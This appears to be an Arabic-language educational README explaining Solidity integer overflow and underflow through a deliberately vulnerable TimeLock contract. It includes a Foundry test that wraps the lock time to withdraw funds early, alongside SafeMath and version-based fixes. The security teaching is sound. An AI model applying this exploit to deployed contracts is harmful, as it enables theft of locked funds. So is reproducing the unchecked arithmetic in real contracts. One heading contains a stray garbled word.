# Web3eg-Smart-Contract-Hacking-overFlow-and-underFlow
شرح الـ Overflow والـ Underflow في Solidity
في Solidity (لغة برمجة العقود الذكية في Ethereum)، الـ Overflow والـ Underflow هما نوعان من الأخطاء الحسابية التي تحدث عندما تتجاوز العمليات الحسابية حدود الأنواع الرقمية (مثل uint أو int). كانت هذه المشاكل شائعة في الإصدارات القديمة من Solidity (قبل 0.8.0) لأنها لم تتحقق تلقائيًا من التجاوز الحسابي. فيما يلي شرح مفصل للمفهومين:
1. الـ Overflow (التجاوز)

التعريف: يحدث الـ Overflow عندما تتجاوز نتيجة عملية حسابية (مثل الجمع أو الضرب) الحد الأقصى للقيمة التي يمكن تخزينها في نوع البيانات. على سبيل المثال، نوع uint256 له حد أقصى هو 2^256 - 1 (حوالي 115792089237316195423570985008687907853269984665640564039457584007913129639935).
مثال:uint8 x = 255;
x = x + 1; // يحدث Overflow

بدلاً من أن تصبح x = 256، تصبح x = 0 لأن القيمة "تلف" (wrap around) إلى الصفر.
في عقد TimeLock: دالة increaseTimeLock عرضة للـ Overflow لأنها تضيف _increaseTimeLock إلى timeLock[msg.sender] بدون فحص التجاوز:function increaseTimeLock(uint _increaseTimeLock) public {
    timeLock[msg.sender] += _increaseTimeLock;
}

إذا أدخل المهاجم قيمة كبيرة (مثل 2^256 - timeLock[msg.sender] + 1)، يمكن أن يتسبب في جعل timeLock[msg.sender] صغيرة جدًا (مثل 0)، مما يسمح بتجاوز شرط timeLock[msg.sender] < block.timestamp في دالة withdraw.

2. الـ Underflow (النقصان التحتي)

التعريف: يحدث الـ Underflow عندما تؤدي عملية حسابية (مثل الطرح) إلى قيمة أقل من الحد الأدنى لنوع البيانات. بالنسبة لـ uint256، الحد الأدنى هو 0، فإذا حاولت طرح قيمة من 0، سيحدث Underflow.
مثال:uint8 x = 0;
x = x - 1; // يحدث Underflow

بدلاً من أن تصبح x = -1، تصبح x = 255 لأن القيمة "تلف" إلى الحد الأقصى لـ uint8.
في العقود الذكية: قد يحدث الـ Underflow في عمليات الطرح، مثل تقليل رصيد المستخدم. إذا كان balances[msg.sender] = 0 وحاولت طرح قيمة، فقد ينتج عن ذلك قيمة كبيرة جدًا (مثل 2^256 - 1).

لماذا هما مشكلة؟
في الإصدارات القديمة من Solidity (مثل ^0.7.0 المستخدم في TimeLock)، العمليات الحسابية لا تتحقق تلقائيًا من الـ Overflow أو الـ Underflow. هذا يسمح للمهاجمين باستغلال هذه الثغرات. في عقد TimeLock:

يمكن للمهاجم التسبب في Overflow في timeLock[msg.sender] عن طريق استدعاء increaseTimeLock بقيمة كبيرة، مما يجعل timeLock صغيرة بما يكفي للسحب الفوري.
الـ Underflow غير موجود مباشرة في هذا العقد لأنه لا يحتوي على عمليات طرح، لكن لو وجدت دالة تطرح من balances أو timeLock، لكانت عرضة للـ Underflow.

كيفية منع الـ Overflow والـ Underflow

استخدام إصدار Solidity >= 0.8.0:

بدءًا من الإصدار 0.8.0، يتم التحقق من الـ Overflow والـ Underflow تلقائيًا. إذا حدث تجاوز، يتم إرجاع خطأ (revert).
مثال:pragma solidity ^0.8.0;
uint256 x = type(uint256).max;
x += 1; // سيؤدي إلى revert بدلاً من Overflow




استخدام مكتبة SafeMath:

مكتبة SafeMath من OpenZeppelin تضيف فحوصات للعمليات الحسابية.
مثال في TimeLock:import "@openzeppelin/contracts/math/SafeMath.sol";

contract TimeLock {
    using SafeMath for uint256;
    mapping(address => uint256) balances;
    mapping(address => uint256) timeLock;

    function increaseTimeLock(uint256 _increaseTimeLock) public {
        timeLock[msg.sender] = timeLock[msg.sender].add(_increaseTimeLock); // يتحقق من الـ Overflow
    }
}




التحقق اليدوي:

إضافة شروط يدوية:function increaseTimeLock(uint _increaseTimeLock) public {
    uint newTimeLock = timeLock[msg.sender] + _increaseTimeLock;
    require(newTimeLock >= timeLock[msg.sender], "Overflow detected");
    timeLock[msg.sender] = newTimeLock;
}





العلاقة مع عقد TimeLock

الثغرة: دالة increaseTimeLock عرضة للـ Overflow، مما يسمح للمهاجم بتقليل timeLock وتجاوز قيد الوقت في withdraw.
الـ Underflow: غير موجود في هذا العقد لأنه لا يحتوي على عمليات طرح.

مح LANDINGاكاة الـ Overflow باستخدام Foundry

المهاجم يودع إيثر باستخدام deposit.
يستدعي increaseTimeLock بقيمة كبيرة (مثل 2^256 - timeLock + 1) للتسبب في Overflow.
يستدعي withdraw لسحب الأموال فورًا.

مثال اختبار Foundry:
function testOverflowAttack() public {
    vm.prank(attacker);
    timeLock.deposit{value: 1 ether}();
    uint currentTimeLock = timeLock.timeLock(attacker);
    uint overflowAmount = type(uint256).max - currentTimeLock + 1;
    vm.prank(attacker);
    timeLock.increaseTimeLock(overflowAmount);
    vm.prank(attacker);
    timeLock.withdraw();
    assertEq(attacker.balance, 1 ether);
}

الخلاصة

الـ Overflow: يحدث عندما تتجاوز القيمة الحد الأقصى لنوع البيانات وتعود إلى قيمة صغيرة.
الـ Underflow: يحدث عندما تصبح القيمة أقل من الحد الأدنى وتعود إلى الحد الأقصى.
في TimeLock: الثغرة هي Overflow في increaseTimeLock.
الوقاية: استخدام Solidity >= 0.8.0، مكتبة SafeMath، أو فحوصات يدوية.

why use timeVualt?
1- vesting contract
2- timeLock governance
3-  IDO/ LuanchToken
4- staking
